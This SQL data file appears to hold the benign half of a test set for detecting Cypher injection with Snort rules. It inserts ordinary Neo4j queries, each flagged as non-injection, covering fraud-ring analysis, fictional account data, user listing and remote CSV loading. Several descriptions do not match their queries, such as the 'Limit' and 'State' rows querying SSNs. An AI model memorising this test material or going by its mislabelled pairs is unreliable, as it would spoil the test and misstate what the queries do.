INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Find account holders who share more than one piece of legitimate contact information','MATCH                 (accountHolder:AccountHolder)-[]->(contactInformation) WITH                 contactInformation, count(accountHolder) AS RingSize MATCH                 (contactInformation)<-[]-(accountHolder) WITH                 collect(accountHolder.UniqueId) AS AccountHolders,                        contactInformation, RingSize WHERE                 RingSize > 1 RETURN                 AccountHolders AS FraudRing,                        labels(contactInformation) AS ContactType,                        RingSize ORDER BY         RingSize DESC',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Determine the financial risk of a possible fraud ring','MATCH                 (accountHolder:AccountHolder)-[]->(contactInformation)WITH                 contactInformation,                        count(accountHolder) AS RingSize MATCH                 (contactInformation)<-[]-(accountHolder),                       (accountHolder)-[r:HAS_CREDITCARD|HAS_UNSECUREDLOAN]->(unsecuredAccount) WITH                 collect(DISTINCT accountHolder.UniqueId) AS AccountHolders,                        contactInformation, RingSize,                        SUM(CASE type(r)                                WHEN ''HAS_CREDITCARD'' THEN unsecuredAccount.Limit                                WHEN ''HAS_UNSECUREDLOAN'' THEN unsecuredAccount.Balance                                ELSE 0                        END) as FinancialRisk WHERE                 RingSize > 1 RETURN                 AccountHolders AS FraudRing,                        labels(contactInformation) AS ContactType,                        RingSize,                        round(FinancialRisk) as FinancialRisk ORDER BY         FinancialRisk DESC',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Create account holders','CREATE (accountHolder4:AccountHolder {                       FirstName: "Michael",                      LastName: "Doe",                       UniqueId: "MichaelDoe" })',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Create address','CREATE (address2:Address {                        Street: "123 SW 2st Street",                    City: "San Francisco",                        State: "California", ZipCode: "94101" })',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Connect an account holder to an address','CREATE (accountHolder4)-[:HAS_ADDRESS]->(address2)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Create phone number','CREATE (phoneNumber2:PhoneNumber { PhoneNumber: "444-555-5555" })',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Connect account holder to phone number','CREATE (accountHolder4)-[:HAS_PHONENUMBER]->(phoneNumber2)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Create SSN','CREATE (ssn3:SSN { SSN: "242-34-2345" })',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Connect account holder to SSN','CREATE (accountHolder4)-[:HAS_SSN]->(ssn3)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Create SSN and connect an account holder','CREATE (ssn3:SSN { SSN: "243-45-6789" })<-[:HAS_SSN]-(accountHolder4)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Create credit card and connect account holder','CREATE (creditCard3:CreditCard {                        AccountNumber: "1987654321012345",                        Limit: 1000, Balance: 442.23,                        ExpirationDate: "02-27",                        SecurityCode: "234" })<-[:HAS_CREDITCARD]-(accountHolder4)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Create bank account and connect an account holder','CREATE (bankAccount2:BankAccount { AccountNumber: "3456789012345678", Balance: 4054.43 })<-[:HAS_BANKACCOUNT]-(accountHolder4)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Create an unsecured loan and connect an account holder','CREATE (unsecuredLoan4:UnsecuredLoan {                        AccountNumber: "4567890123456789-1",                        Balance: 8045.53,                       APR: .0541,                        LoanAmount: 10000.00 })<-[:HAS_UNSECUREDLOAN]-(accountHolder4)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all credit cards','MATCH (n:CreditCard) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all addresses','MATCH (n:Address) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all account holders','MATCH (n:AccountHolder) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all bank accounts','MATCH (n:BankAccount) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all phone numbers','MATCH (n:PhoneNumber) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all unsecured loans','MATCH (n:UnsecuredLoan) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all SSNs','MATCH (n:SSN) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes that have addresses','MATCH p=()-[r:HAS_ADDRESS]->() RETURN p',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes that have bank accounts','MATCH p=()-[r:HAS_BANKACCOUNT]->() RETURN p',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes that have credit cards','MATCH p=()-[r:HAS_CREDITCARD]->() RETURN p',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes that have phone numbers','MATCH p=()-[r:HAS_PHONENUMBER]->() RETURN p',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes that have SSNs','MATCH p=()-[r:HAS_SSN]->() RETURN p',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes that have unsecured loans','MATCH p=() -[r:HAS_UNSECUREDLOAN]->() RETURN p',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the SSN property','MATCH (n) WHERE (n.SSN) IS NOT NULL RETURN DISTINCT "node" as entity, n.SSN AS SSN UNION ALL MATCH ()-[r]-() WHERE (r.SSN) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.SSN AS SSN',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the APR property','MATCH (n) WHERE (n.APR) IS NOT NULL RETURN DISTINCT "node" as entity, n.APR AS APR UNION ALL MATCH ()-[r]-() WHERE (r.APR) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.APR AS APR',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the AccountNumber property','MATCH (n) WHERE (n.AccountNumber) IS NOT NULL RETURN DISTINCT"node" as entity, n.AccountNumber AS AccountNumber UNION ALL MATCH ()-[r]-() WHERE (r.AccountNumber) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.AccountNumber AS AccountNumber',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the Balance property','MATCH (n) WHERE (n.Balance) IS NOT NULL RETURN DISTINCT "node" as entity, n.Balance AS Balance UNION ALL MATCH ()-[r]-() WHERE (r.Balance) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.Balance AS Balance',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the City property','MATCH (n) WHERE (n.City) IS NOT NULL RETURN DISTINCT "node" as entity, n.City AS City UNION ALL MATCH ()-[r]-() WHERE (r.City) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.City AS City',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the ExpirationDate property','MATCH (n) WHERE (n.ExpirationDate) IS NOT NULL RETURN DISTINCT "node" as entity, n.ExpirationDate AS ExpirationDate UNION ALL MATCH ()-[r]-() WHERE (r.ExpirationDate) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.ExpirationDate AS ExpirationDate',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the FirstName property','MATCH (n) WHERE (n.FirstName) IS NOT NULL RETURN DISTINCT "node" as entity, n.FirstName AS FirstName UNION ALL MATCH ()-[r]-() WHERE (r.FirstName) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.FirstName AS FirstName',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the LastName property','MATCH (n) WHERE (n.LastName) IS NOT NULL RETURN DISTINCT "node" as entity, n.LastName AS LastName UNION ALL MATCH ()-[r]-() WHERE (r.LastName) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.LastName AS LastName',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the Limit property','MATCH (n) WHERE (n.SSN) IS NOT NULL RETURN DISTINCT "node" as entity, n.SSN AS SSN UNION ALL MATCH ()-[r]-() WHERE (r.SSN) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.SSN AS SSN',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the LoanAmount property','MATCH (n) WHERE (n.LoanAmount) IS NOT NULL RETURN DISTINCT "node" as entity, n.LoanAmount AS LoanAmount UNION ALL MATCH ()-[r]-() WHERE (r.LoanAmount) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.LoanAmount AS LoanAmount',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the PhoneNumber property','MATCH (n) WHERE (n.PhoneNumber) IS NOT NULL RETURN DISTINCT "node" as entity, n.PhoneNumber AS PhoneNumber UNION ALL MATCH ()-[r]-() WHERE (r.PhoneNumber) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.PhoneNumber AS PhoneNumber',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the SecurityCode property','MATCH (n) WHERE (n.SecurityCode) IS NOT NULL RETURN DISTINCT "node" as entity, n.SecurityCode AS SecurityCode UNION ALL MATCH ()-[r]-() WHERE (r.SecurityCode) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.SecurityCode AS SecurityCode',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the State property','MATCH (n) WHERE (n.SSN) IS NOT NULL RETURN DISTINCT "node" as entity, n.SSN AS SSN UNION ALL MATCH ()-[r]-() WHERE (r.SSN) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.SSN AS SSN',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the Street property','MATCH (n) WHERE (n.Street) IS NOT NULL RETURN DISTINCT "node" as entity, n.Street AS Street UNION ALL MATCH ()-[r]-() WHERE (r.Street) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.Street AS Street',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the UniqueId property','MATCH (n) WHERE (n.UniqueId) IS NOT NULL RETURN DISTINCT "node" as entity, n.UniqueId AS UniqueId UNION ALL MATCH ()-[r]-() WHERE (r.UniqueId) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.UniqueId AS UniqueId',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all nodes and relationships that have the ZipCode property','MATCH (n) WHERE (n.ZipCode) IS NOT NULL RETURN DISTINCT "node" as entity, n.ZipCode AS ZipCode UNION ALL MATCH ()-[r]-() WHERE (r.ZipCode) IS NOT NULL RETURN DISTINCT "relationship" AS entity, r.ZipCode AS ZipCode',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return specific account holder','MATCH (Matt:AccountHolder {UniqueId: ''MattSmith''}) RETURN Matt',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return specific address','MATCH (Address1:Address{Street: ''123 NW 1st Street''})RETURN Address1',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return specific bank account','MATCH (Acct1:BankAccount {AccountNumber: ''2345678901234567''}) RETURN Acct1',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return specific credit card','MATCH (c:CreditCard {AccountNumber: ''1234567890123456''}) RETURN c',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return specific phone number','MATCH (n:PhoneNumber {PhoneNumber: ''555-555-1234''}) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return specific SSN','MATCH (n:SSN {SSN: ''241-23-1234''}) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return specific unsecured loan','MATCH (n:UnsecuredLoan {AccountNumber: ''5678901234567890-0''}) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return shortest path','MATCH (Matt:AccountHolder { UniqueId:"MattSmith" }),(John:AccountHolder { UniqueId:"JohnDoe" }), p = shortestPath((Matt)-[*..15]-(John)) RETURN p',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return 0 results','MATCH (n:UnsecuredLoan {AccountNumber: ''5678901234567890-1''}) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('divide by 0 error','return 10/0',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('invalid syntax','MATCH (n:UnsecuredLoan {AccountNumber: ''5678901234567890-1''}) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all node labels','MATCH (n) RETURN distinct labels(n)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all relationships','match p=()-[r:%]-() return distinct r',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return valid division','return 10/2',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return count by node label','MATCH (n) RETURN distinct labels(n), count(*)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return distance between account holders','MATCH (Matt:AccountHolder { UniqueId:"MattSmith" }),(John:AccountHolder { UniqueId:"JohnDoe" }), p = shortestPath((Matt)-[*..15]-(John)) RETURN length(p)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return all databases','show databases',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('create account object','CREATE (n:Account) SET n.id=1, n.username="admin",n.admin=False,n.password="password" RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('delete account object','MATCH (n:Account {id:1}) DELETE n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Get all nodes that have a label "Fruit"','MATCH (a:Fruit) RETURN a',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Get all "Fruit" nodes that have a specific property','MATCH (a:Fruit {title: ''Green Apple''}) RETURN a',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Get all "Fruit" nodes that have a specific property','MATCH (a:Fruit) WHERE a.title = "Green Apple" RETURN a',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Limit the numbers of results','MATCH (a:Fruit) RETURN a LIMIT 20',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('order results','MATCH (a:Fruit) RETURN a ORDER BY a.title',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('create and return','CREATE (n:Account) SET n.id=1, n.username="admin",n.password="password123" RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Retrieve all labels in a graph & remove duplicates:','MATCH (a) return DISTINCT labels(a)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Retrieve all labels in a graph & remove duplicates:','CALL db.labels()',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Retrieve all labels in a graph & remove duplicates:','CALL db.labels() YIELD label',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Retrieve all labels in a graph & remove duplicates:','CALL db.labels() YIELD label AS x',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('yield stores results in a variable','CALL db.labels() YIELD label RETURN count(label)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('yield stores results in a variable','CALL db.labels() YIELD label AS x RETURN count(x)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Retrieve properties of a label','MATCH (c) WHERE c.name = ''Spongebob'' RETURN keys(c)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('Retrieve unique properties of a label','MATCH (c:Character) RETURN DISTINCT keys(c)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('list current user','SHOW CURRENT USER',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('list all users','SHOW USERS',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('list available functions','CALL dbms.procedures()',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('list user roles','USE system CALL dbms.security.listRoles()',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('return values in a single list','MATCH (c:Character) RETURN collect(c.name)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('split a string into a list of strings','RETURN split(''one,two'', '','')',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('multiple queries in one statement','MATCH (john:Person {name: ''John''}) MATCH (john)-[:FRIEND]->(friend) RETURN friend.name AS friendName',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('multiple returns in a union','MATCH (n:Person) RETURN n.name AS name UNION MATCH (b:Book) RETURN b.title AS name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('erroneous syntax for multiple returns in a union','MATCH (p:Person) RETURN p.name UNION MATCH (b:Book) RETURN b.title',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('chain together queries using WITH clause','MATCH (c) WITH c ORDER BY c.Character DESC LIMIT 3 RETURN collect(c.name)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('call a procedure','CALL db.labels()',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('load a local CSV','LOAD CSV FROM ''file:///users.csv'' AS line RETURN line',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('load a remote CSV','LOAD CSV FROM ''https://domain.com/data.csv'' AS line RETURN line',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('call apoc function','CALL apoc.help(''apoc'')',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('optional match','OPTIONAL MATCH (n:Person)-[r]->(m:Person {name: ''Alice''}) RETURN n, r, m',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('update using set','MATCH (n:Label) WHERE n.id = 123 SET n:Person',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('upsert using MERGE','MERGE (n:Label {name: $value}) ON CREATE SET n.created = timestamp() ON MATCH SET  n.counter = coalesce(n.counter, 0) + 1,   n.accessTime = timestamp()',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('delete with return','MATCH (n1:Label)-[r {id: 123}]->(n2:Label) CALL {WITH n1 MATCH (n1)-[r1]-() RETURN count(r1) AS rels1} CALL {  WITH n2 MATCH (n2)-[r2]-()  RETURN count(r2) AS rels2} DELETE r RETURN  n1.name AS node1, rels1 - 1 AS relationships1,  n2.name AS node2, rels2 - 1 AS relationships2',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('remove a label','MATCH (n:Label) WHERE n.id = 123 REMOVE n:Label',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('match multiple labels','MATCH (n:Person&Employee) RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('relationship not','MATCH (n:Person)-[r:!FRIEND_OF]->(m:Person) RETURN n,m',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('complex relationship patterns','MATCH (n:Person {name: ''Alice''})-[r:KNOWS]->(m:Person)<-[r2:OWNS]-(c:Car {type: ''Volvo''}) return c',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('equijoin','MATCH (n:Person {name: ''Alice''})-[:KNOWS]->(:Person)<-[:KNOWS]-(:Person)-[:KNOWS]-(n) return n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('quantified path patterns','MATCH ((m:Person)-[:KNOWS]->(n:Person) WHERE m.born < n.born){1,5} return m',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('graph patterns','MATCH (n:Person {name: ''ALICE''})-[r:KNOWS]->(m:Person {name: ''Bob''})<--(o), (m)<-[:FRIEND_OF]-(p) RETURN m,o',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('all shortest paths','MATCH allShortestPaths((n:Person)-[:KNOWS*]-(m:Person)) RETURN m',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('variable-length relationships','MATCH (n:Label)-[*0..]->(m:Label) return m',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('run a mutating operation for each element in a list','WITH [''Alice'', ''Neo''] AS names FOREACH ( value IN names | CREATE (:Person {name: value}) ) ',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('show functions','SHOW FUNCTIONS EXECUTABLE BY user_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('show transactions','SHOW TRANSACTIONS',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('terminate all transactions and list remaining','SHOW TRANSACTIONS  YIELD transactionId AS txId, username  WHERE username = ''user_name'' TERMINATE TRANSACTIONS txId  YIELD message   WHERE NOT message = ''Transaction terminated.''  RETURN txId',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('unwind','UNWIND $names AS name MATCH (n:Label {name: $value}) RETURN avg(n.age) AS average',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('lists','WITH [''Alice'', ''Neo'', ''Cypher''] AS names RETURN names',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('literal map','RETURN {name: ''Alice'', age: 20, address: {city: ''London'', residential: true}} AS alice',0,0);
